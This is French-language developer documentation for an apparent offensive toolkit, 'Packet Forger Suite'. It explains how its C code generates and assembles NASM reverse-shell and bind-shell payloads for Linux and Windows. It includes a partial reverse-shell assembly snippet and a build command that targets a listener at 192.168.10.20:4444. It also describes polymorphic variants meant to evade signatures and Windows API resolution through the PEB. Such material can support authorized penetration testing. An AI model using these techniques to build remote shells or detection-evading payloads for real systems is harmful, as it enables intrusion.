# 📍 Localisation du Code Assembleur

## 🎯 Vue d'Ensemble

Le code assembleur dans Packet Forger Suite n'est **pas stocké dans des fichiers `.asm` statiques**. Il est **généré dynamiquement** par du code C qui écrit du code NASM dans des fichiers temporaires, puis l'assemble.

## 📁 Fichiers Générant du Code Assembleur

### 1. `packet-forger-payloads/src/asm_generator.c`

**Fonctions principales** :
- `generate_asm_reverse_shell_linux()` : Génère du NASM pour reverse shell Linux x64
- `generate_asm_bind_shell_linux()` : Génère du NASM pour bind shell Linux x64
- `generate_asm_reverse_shell_windows()` : Génère du NASM pour reverse shell Windows x64
- `assemble_nasm_shellcode()` : Assemble un fichier `.asm` avec NASM et extrait le shellcode

**Exemple de code généré** :
```nasm
; Reverse Shell Linux x64 - Généré automatiquement
; IP: 192.168.10.20, Port: 4444
BITS 64

section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    xor rdi, rdi
    push 2
    pop rdi
    push 41
    pop rax
    syscall
    ; ... etc
```

### 2. `packet-forger-payloads/src/polymorphic_shellcode.c`

**Fonctions principales** :
- `generate_polymorphic_asm_reverse_shell_linux()` : Génère du NASM polymorphe Linux
- `generate_polymorphic_asm_reverse_shell_windows()` : Génère du NASM polymorphe Windows
- `generate_polymorphic_nop()` : Génère des NOPs variés (0x90, 0x66 0x90, etc.)

**Techniques de polymorphisme** :
- NOP sleds variés
- Instructions équivalentes (mov vs xor)
- Réorganisation des instructions
- Dead code insertion

### 3. `packet-forger-payloads/src/windows_shellcode_generator.c`

**Fonctions principales** :
- `generate_windows_asm_reverse_shell_complete()` : Génère du NASM Windows complet avec résolution dynamique d'API
- `generate_windows_shellcode_dynamic()` : Génère un shellcode Windows (utilise le code NASM en interne)

**Caractéristiques** :
- ✅ **Résolution dynamique des API Windows via PEB** : Trouve kernel32.dll sans imports statiques
- ✅ **Résolution via GetProcAddress** : Trouve toutes les fonctions nécessaires dynamiquement
- ✅ **Chargement de ws2_32.dll** : Via LoadLibraryA pour les fonctions réseau
- ✅ **Pas de hardcoding d'adresses** : Compatible avec différentes versions de Windows
- ✅ **Reverse shell complet** : WSAStartup → WSASocketA → connect → SetStdHandle → CreateProcess(cmd.exe)

**Fonctions Windows résolues dynamiquement** :
- GetProcAddress (via hash)
- LoadLibraryA
- WSAStartup
- WSASocketA
- connect
- SetStdHandle
- CreateProcessA

## 🔄 Workflow de Génération

### Étape 1 : Génération du Code NASM

```c
// Exemple dans asm_generator.c
int generate_asm_reverse_shell_linux(...) {
    FILE *fp = fopen("/tmp/shellcode_123.asm", "w");
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "_start:\n");
    fprintf(fp, "    xor rax, rax\n");
    // ... génération du code NASM
    fclose(fp);
}
```

### Étape 2 : Assemblage avec NASM

```c
// Dans assemble_nasm_shellcode()
system("nasm -f elf64 shellcode.asm -o shellcode.o");
system("objcopy -O binary -j .text shellcode.o shellcode.bin");
```

### Étape 3 : Extraction du Shellcode

```c
// Lecture du fichier binaire
fread(shellcode, 1, size, fp);
```

## 📂 Fichiers Temporaires

Les fichiers `.asm` sont créés dans `/tmp/` avec des noms uniques :
- `/tmp/packet_forger_shellcode_<pid>.asm` (génération standard)
- `/tmp/packet_forger_poly_<pid>_<timestamp>.asm` (génération polymorphe)

**Note** : Ces fichiers sont supprimés automatiquement après l'assemblage.

## 🔍 Comment Voir le Code Assembleur Généré

### Option 1 : Utiliser l'option `--asm`

```bash
cd packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --asm \
    --output payload.bin
```

Le code NASM sera généré dans `/tmp/` avant l'assemblage.

### Option 2 : Modifier temporairement le code

Pour sauvegarder le fichier `.asm`, modifier `asm_generator.c` :

```c
// Au lieu de :
unlink(asm_file);

// Commenter la suppression :
// unlink(asm_file);
```

### Option 3 : Utiliser les fonctions directement

```c
#include "payload_generator.h"

char asm_file[] = "/tmp/my_shellcode.asm";
generate_asm_reverse_shell_linux("192.168.10.20", 4444, asm_file);
// Le fichier .asm est maintenant disponible
```

## 📚 Structure du Code Assembleur

### Linux x64

```nasm
BITS 64
section .text
global _start

_start:
    ; 1. socket()
    ; 2. connect()
    ; 3. dup2() pour stdin/stdout/stderr
    ; 4. execve("/bin/sh")
```

### Windows x64

```nasm
BITS 64
section .text

_start:
    ; 1. Résolution dynamique des API (PEB traversal)
    ; 2. WSAStartup()
    ; 3. WSASocket()
    ; 4. WSAConnect()
    ; 5. CreateProcess() pour cmd.exe
```

## 🎯 Points Clés

1. **Génération dynamique** : Le code NASM est généré à la volée, pas stocké
2. **Fichiers temporaires** : Créés dans `/tmp/` puis supprimés
3. **Pipeline NASM** : C → NASM → objcopy → shellcode binaire
4. **Polymorphisme** : Variantes générées pour éviter les signatures

## 📖 Références

- `packet-forger-payloads/src/asm_generator.c` : Génération NASM standard
- `packet-forger-payloads/src/polymorphic_shellcode.c` : Génération NASM polymorphe
- `packet-forger-payloads/src/windows_shellcode_generator.c` : Génération NASM Windows

---

**Note** : Pour voir le code assembleur généré, utiliser `--asm` ou modifier temporairement le code pour ne pas supprimer les fichiers temporaires.

